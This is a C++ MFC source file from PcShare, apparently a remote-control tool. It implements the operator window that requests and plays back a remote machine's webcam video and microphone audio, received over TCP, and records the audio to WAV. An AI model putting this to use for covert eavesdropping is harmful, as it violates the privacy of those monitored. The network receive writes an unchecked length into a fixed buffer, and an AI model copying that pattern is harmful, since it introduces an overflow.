// MainFrm.cpp : implementation of the CMyMultWnd class
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyMultWnd.h"
#include "MyWaitClientDlg.h"
#include "lzw.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

using namespace Gdiplus;

/////////////////////////////////////////////////////////////////////////////
// CMyMultWnd

IMPLEMENT_DYNCREATE(CMyMultWnd, CMyBaseWnd)

BEGIN_MESSAGE_MAP(CMyMultWnd, CMyBaseWnd)
	//{{AFX_MSG_MAP(CMyMultWnd)
	ON_WM_CREATE()
	ON_UPDATE_COMMAND_UI(ID_MULT_START, OnUpdateMultStart)
	ON_COMMAND(ID_MULT_START, OnMultStart)
	ON_COMMAND(ID_MULT_STOP, OnMultStop)
	ON_UPDATE_COMMAND_UI(ID_MULT_STOP, OnUpdateMultStop)
	ON_COMMAND(ID_MULT_SAVE, OnMultSave)
	ON_UPDATE_COMMAND_UI(ID_MULT_SAVE, OnUpdateMultSave)
	ON_COMMAND(ID_AUDIO_INIT, OnAudioInit)
	ON_UPDATE_COMMAND_UI(ID_AUDIO_INIT, OnUpdateAudioInit)
	ON_COMMAND(ID_AUDIO_START, OnAudioStart)
	ON_UPDATE_COMMAND_UI(ID_AUDIO_START, OnUpdateAudioStart)
	ON_COMMAND(ID_AUDIO_STOP, OnAudioStop)
	ON_UPDATE_COMMAND_UI(ID_AUDIO_STOP, OnUpdateAudioStop)
	ON_WM_COPYDATA()
	ON_COMMAND(ID_VIDEO_INIT, OnVideoInit)
	ON_UPDATE_COMMAND_UI(ID_VIDEO_INIT, OnUpdateVideoInit)
	//}}AFX_MSG_MAP
	ON_COMMAND(ID_EXIT, OnClose)
	ON_UPDATE_COMMAND_UI(IDS_UPDATEPANE, OnUpdatePane)
	ON_MESSAGE(WM_MULTINSERTBUF, OnMultInsertBuf)
	ON_MESSAGE(MM_WOM_DONE, OnWOM_DONE)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyMultWnd construction/destruction

CMyMultWnd::CMyMultWnd()
{
	pMultView = NULL;
	hIcon = AfxGetApp()->LoadIcon(IDI_ICON_MULT);
	
	hThreadAudio = NULL;

	m_IsVideoInit = FALSE;
	m_IsAudioInit = FALSE;
	m_IsAudioRecord = FALSE;
	m_IsInitAudio = FALSE;
	hAudioFile = NULL;
	m_IsExit = FALSE;
}

CMyMultWnd::~CMyMultWnd()
{
	if(hAudioFile != NULL)
	{
		mmioAscend ( hAudioFile, &m_MMCKInfoChild, 0 );
		mmioAscend ( hAudioFile, &m_MMCKInfoParent, 0 );
		mmioClose(hAudioFile, 0);
	}

	for(POSITION pos = m_BufList.GetHeadPosition(); pos != NULL;)
	{
		LPWAVEHDR pHdr = (LPWAVEHDR) m_BufList.GetAt(pos);
		if(pHdr != NULL)
		{
			delete [] pHdr->lpData;
			delete pHdr;
		}
		m_BufList.GetNext(pos);
	}
	m_BufList.RemoveAll();
}

int CMyMultWnd::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if(CMyBaseWnd::OnCreate(lpCreateStruct) == -1)
	{
		return -1;
	}
	SetActiveView(pMultView);

	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_wndToolBar.LoadToolBar(IDR_TOOLBAR_MULT))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}

	m_ToolBarList.Create(24, 24, ILC_COLOR24|ILC_MASK, 10, 10);

	m_ToolBarList.Add(IDB_BITMAP_AUDIO_START);
	m_ToolBarList.Add(IDB_BITMAP_VIDEO_RECORDE_START);
	m_ToolBarList.Add(IDB_BITMAP_VIDEO_RECORDE_STOP);
	m_ToolBarList.Add(IDB_BITMAP_VIDEO_SAVE);

	m_ToolBarList.Add(IDB_BITMAP_AUDIO_START);
	m_ToolBarList.Add(IDB_BITMAP_AUDIO_RECORDE_START);
	m_ToolBarList.Add(IDB_BITMAP_AUDIO_RECORDE_STOP);

	m_wndToolBar.GetToolBarCtrl().SetImageList(&m_ToolBarList);

	m_wndToolBar.SetButtonText(0, _T("获取视频"));// "*" to _T("*") [9/15/2007 zhaiyinwei]
	m_wndToolBar.SetButtonText(1, _T("开始录像"));// "*" to _T("*") [9/15/2007 zhaiyinwei]
	m_wndToolBar.SetButtonText(2, _T("停止录像"));// "*" to _T("*") [9/15/2007 zhaiyinwei]
	m_wndToolBar.SetButtonText(3, _T("保存图象"));// "*" to _T("*") [9/15/2007 zhaiyinwei]

	m_wndToolBar.SetButtonText(5, _T("监听声音"));// "*" to _T("*") [9/15/2007 zhaiyinwei]
	m_wndToolBar.SetButtonText(6, _T("开始录音"));// "*" to _T("*") [9/15/2007 zhaiyinwei]
	m_wndToolBar.SetButtonText(7, _T("停止录音"));// "*" to _T("*") [9/15/2007 zhaiyinwei]

	m_wndToolBar.SetButtonStyle(0, TBBS_AUTOSIZE);
	m_wndToolBar.SetButtonStyle(1, TBBS_AUTOSIZE);
	m_wndToolBar.SetButtonStyle(2, TBBS_AUTOSIZE);
	m_wndToolBar.SetButtonStyle(3, TBBS_AUTOSIZE);

	m_wndToolBar.SetButtonStyle(5, TBBS_AUTOSIZE);
	m_wndToolBar.SetButtonStyle(6, TBBS_AUTOSIZE);
	m_wndToolBar.SetButtonStyle(7, TBBS_AUTOSIZE);

	m_wndToolBar.GetToolBarCtrl().SetButtonSize(CSize(24, 24 + 19));
	m_wndToolBar.GetToolBarCtrl().SetBitmapSize(CSize(24, 24));
	m_wndToolBar.GetToolBarCtrl().SetDisabledImageList(&m_ToolBarList);
	CenterWindow();
	return 0;
}

BOOL CMyMultWnd::OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext) 
{
	CCreateContext pCreateContext; 
	pCreateContext.m_pCurrentFrame = this;
	pCreateContext.m_pCurrentDoc = NULL;
	pCreateContext.m_pNewViewClass = RUNTIME_CLASS(CMyMultView);

	pMultView = (CMyMultView*) CreateView(&pCreateContext,AFX_IDW_PANE_FIRST);
	return TRUE;
}

int CMyMultWnd::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
	lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
	return FALSE;
}

void CMyMultWnd::OnUpdatePane(CCmdUI* pCmdUI) 
{
	if(pMultView != NULL)
	{
		pCmdUI->SetText(pMultView->GetXy());
	}
}

/////////////////////////////////////////////////////////////////////////////
// CMyMultWnd diagnostics

#ifdef _DEBUG
void CMyMultWnd::AssertValid() const
{
	CMyBaseWnd::AssertValid();
}

void CMyMultWnd::Dump(CDumpContext& dc) const
{
	CMyBaseWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyMultWnd message handlers

void CMyMultWnd::OnClose() 
{
	m_AudioTran.Close();
	if(WaitForSingleObject(hThreadAudio, 1000) != WAIT_OBJECT_0)
	{
		TerminateThread(hThreadAudio, 0);
	}
	OnAudioStop();
	CMyBaseWnd::OnClose();
}

void CMyMultWnd::OnUpdateMultStart(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pMultView->IsCanRecord());		
}

void CMyMultWnd::OnMultStart() 
{
	pMultView->Start();
}

void CMyMultWnd::OnMultStop() 
{
	pMultView->Stop();	
}

void CMyMultWnd::OnUpdateMultStop(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pMultView->IsRecord());	
}

void CMyMultWnd::OnMultSave() 
{
	pMultView->Save();
}

void CMyMultWnd::OnUpdateMultSave(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(pMultView->IsInit());
}

BOOL CMyMultWnd::StartWork(LPCTSTR sCmdStr)
{
	lstrcpy(m_ExtCmdStr, sCmdStr);
	return TRUE;
}

BOOL CMyMultWnd::PreCreateWindow(CREATESTRUCT& cs) 
{
	BOOL bRet = CMyBaseWnd::PreCreateWindow(cs);
	cs.style &= ~WS_MAXIMIZEBOX;

	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(
		CS_VREDRAW | CS_HREDRAW,
		::LoadCursor(NULL, IDC_ARROW),
		(HBRUSH) ::GetStockObject(WHITE_BRUSH),
		hIcon);
	return bRet;
}

void CMyMultWnd::OnAudioInit() 
{
	if(m_IsAudioInit)
	{
		return;
	}
	m_IsAudioInit = TRUE;

	MYCHILDCMDINFO m_Info = {0};

	//ID
	TCHAR m_TmpStr[256] = {0};
	if(!GetStrValue(m_ExtCmdStr, _T("id"), m_TmpStr))
	{
		ASSERT(FALSE);
	}
	lstrcpy(m_Info.m_Id, m_TmpStr);

	//HWND
	if(!GetStrValue(m_ExtCmdStr, _T("hwnd"), m_TmpStr))
	{
		ASSERT(FALSE);
	}
	HWND hSendHwnd = (HWND) StrToInt(m_TmpStr);

	m_Info.m_Info.m_Command = WM_CONNECT_AUDIO;

	//取当前窗口
	m_Info.m_Info.m_Hwnd = GetSafeHwnd();
	
	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_Info;
	ct.cbData = sizeof(MYCHILDCMDINFO);
	ct.dwData = PS_LOCAL_SENDCMD;
	::SendMessage(hSendHwnd, WM_COPYDATA, 0, (LPARAM) &ct);
}

void CMyMultWnd::OnUpdateAudioInit(CCmdUI* pCmdUI) 
{
	pCmdUI->SetCheck(m_IsAudioInit);
	pCmdUI->Enable(!m_IsAudioInit);
}

void CMyMultWnd::OnAudioStart() 
{
	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("音频文件(*.wav)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.wav"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("保存当前音频");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("wav");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		return;
	}

	hAudioFile = mmioOpen (szFile, NULL, MMIO_CREATE|MMIO_WRITE|MMIO_EXCLUSIVE|MMIO_ALLOCBUF );
	if(hAudioFile == NULL)
	{
		MessageBox(_T("创建音频失败！"), _T("提示"), MB_OKCANCEL|MB_ICONWARNING); 
		return;
	}

	ZeroMemory ( &m_MMCKInfoParent, sizeof(MMCKINFO) );
	m_MMCKInfoParent.fccType = mmioFOURCC('W','A','V','E');
	if(mmioCreateChunk( hAudioFile, &m_MMCKInfoParent, MMIO_CREATERIFF) != 0)
	{
		MessageBox(_T("创建音频失败！"), _T("提示"), MB_OKCANCEL|MB_ICONWARNING); 
		return;
	}	
	
	ZeroMemory ( &m_MMCKInfoChild, sizeof(MMCKINFO) );
	m_MMCKInfoChild.ckid = mmioFOURCC('f','m','t',' ');
	m_MMCKInfoChild.cksize = sizeof(WAVEFORMATEX) + m_WaveInfo.cbSize;
	::mmioCreateChunk(hAudioFile, &m_MMCKInfoChild, 0);
	::mmioWrite(hAudioFile, (char*)&m_WaveInfo, sizeof(WAVEFORMATEX) + m_WaveInfo.cbSize); 
	::mmioAscend(hAudioFile, &m_MMCKInfoChild, 0);
	m_MMCKInfoChild.ckid = mmioFOURCC('d', 'a', 't', 'a');
	::mmioCreateChunk (hAudioFile, &m_MMCKInfoChild, 0 );
	m_IsAudioRecord = TRUE;
}

void CMyMultWnd::OnUpdateAudioStart(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(m_IsInitAudio && !m_IsAudioRecord);
}

void CMyMultWnd::OnAudioStop() 
{
	if(hAudioFile != NULL)
	{
		mmioAscend (hAudioFile, &m_MMCKInfoChild, 0 );
		mmioAscend (hAudioFile, &m_MMCKInfoParent, 0 );
		mmioClose(hAudioFile, 0);
		hAudioFile = NULL;
	}
	m_IsAudioRecord = FALSE;
}

void CMyMultWnd::OnUpdateAudioStop(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(m_IsInitAudio && m_IsAudioRecord);
}

void CMyMultWnd::TransAudio()
{
	if(!m_AudioTran.TcpRecvData(&m_WaveInfo, sizeof(WAVEFORMATEX)))
	{
		return;
	}

	WAVEHDR m_WaveHdr = {0};
	if(!m_AudioTran.TcpRecvData(&m_WaveHdr, sizeof(WAVEHDR)))
	{
		return;
	}
	m_WaveHdr.dwFlags = 0;

	//开启音频
	HWAVEOUT hw = NULL;
	if(waveOutOpen(&hw, WAVE_MAPPER, &m_WaveInfo, (DWORD_PTR) GetSafeHwnd(), 0L, CALLBACK_WINDOW) != 0) 
    { 
		return; 
    }

	if(waveOutSetVolume(hw, 0xffffffff) != 0)
	{
		waveOutClose(hw);
		return;
	}

	m_IsInitAudio = TRUE;

	DWORD nRecvLen = 0;
	BYTE* pCurData = new BYTE[m_WaveHdr.dwBufferLength + 65535];
	while(1)
	{
		ZeroMemory(pCurData, m_WaveHdr.dwBufferLength);
		if(!m_AudioTran.TcpRecvData(&nRecvLen, sizeof(DWORD)) || !m_AudioTran.TcpRecvData(pCurData, nRecvLen))
		{
			break;
		}

		LPWAVEHDR pHdr = new WAVEHDR;
		memcpy(pHdr, &m_WaveHdr, sizeof(WAVEHDR));
		pHdr->lpData = new char[pHdr->dwBufferLength + 65535];
		ZeroMemory(pHdr->lpData, pHdr->dwBufferLength + 65535);

		FCLzw lzw;
		lzw.PcUnZip(pCurData, (BYTE*) pHdr->lpData, &pHdr->dwBytesRecorded);
		if(!SendMessage(WM_MULTINSERTBUF, (WPARAM) pHdr, 0))
		{
			delete [] pHdr->lpData;
			delete pHdr;
			break;
		}
	
		pHdr->dwFlags = 0;
		if(waveOutPrepareHeader (hw, pHdr, sizeof(WAVEHDR)) != 0)
		{
			continue;
		}
		waveOutWrite(hw, pHdr, sizeof(WAVEHDR));
	}
	waveOutReset(hw);
	waveOutClose(hw);
	delete [] pCurData;
}

LRESULT CMyMultWnd::OnWOM_DONE(WPARAM wParam, LPARAM lParam)
{
	if(m_IsExit)
	{
		return FALSE;
	}
	HWAVEOUT hw = (HWAVEOUT) wParam;
	LPWAVEHDR pHdr = (LPWAVEHDR) lParam;
	if(waveOutUnprepareHeader (hw, pHdr, sizeof(WAVEHDR)) != 0)
	{
		return FALSE;
	}

	delete [] pHdr->lpData;
	delete pHdr;
	for(POSITION pos = m_BufList.GetHeadPosition(); pos != NULL;)
	{
		if(pHdr == (LPWAVEHDR) m_BufList.GetAt(pos))
		{
			m_BufList.RemoveAt(pos);
			break;
		}
		m_BufList.GetNext(pos);
	}
	return TRUE;
}

void CMyMultWnd::TransAudioThread(LPVOID lPvoid)
{
	CMyMultWnd* pThis = (CMyMultWnd*) lPvoid;
	pThis->TransAudio();
}

LRESULT CMyMultWnd::OnMultInsertBuf(WPARAM wParam, LPARAM lParam)
{
	if(m_IsExit)
	{
		return FALSE;
	}

	LPWAVEHDR pHdr = (LPWAVEHDR) wParam;
	m_BufList.AddTail(pHdr);
	if(hAudioFile != NULL)
	{
		mmioWrite (hAudioFile, pHdr->lpData, pHdr->dwBytesRecorded);
	}
	return TRUE;
}


BOOL CMyMultWnd::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	LPTCPCONNECTINFO pInfo = (LPTCPCONNECTINFO) pCopyDataStruct->lpData;
	if(pCopyDataStruct->dwData == PS_SOCKET_CONNECT)
	{
		if(m_AudioTran.DuplicateHttpSocket(pInfo))
		{
			hThreadAudio = (HANDLE) _beginthread(TransAudioThread, 0, this);
		}
	}	
	return TRUE;
}

void CMyMultWnd::OnVideoInit() 
{
	if(m_IsVideoInit)
	{
		return;
	}
	m_IsVideoInit = TRUE;

	MYCHILDCMDINFO m_Info = {0};

	//ID
	TCHAR m_TmpStr[256] = {0};
	if(!GetStrValue(m_ExtCmdStr, _T("id"), m_TmpStr))
	{
		ASSERT(FALSE);
	}
	lstrcpy(m_Info.m_Id, m_TmpStr);

	//HWND
	if(!GetStrValue(m_ExtCmdStr, _T("hwnd"), m_TmpStr))
	{
		ASSERT(FALSE);
	}
	HWND hSendHwnd = (HWND) StrToInt(m_TmpStr);

	m_Info.m_Info.m_Command = WM_CONNECT_VIDEO;

	//取当前窗口
	m_Info.m_Info.m_Hwnd = pMultView->GetSafeHwnd();
	
	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_Info;
	ct.cbData = sizeof(MYCHILDCMDINFO);
	ct.dwData = PS_LOCAL_SENDCMD;
	::SendMessage(hSendHwnd, WM_COPYDATA, 0, (LPARAM) &ct);		
}

void CMyMultWnd::OnUpdateVideoInit(CCmdUI* pCmdUI) 
{
	pCmdUI->SetCheck(m_IsVideoInit);
	pCmdUI->Enable(!m_IsVideoInit);
}
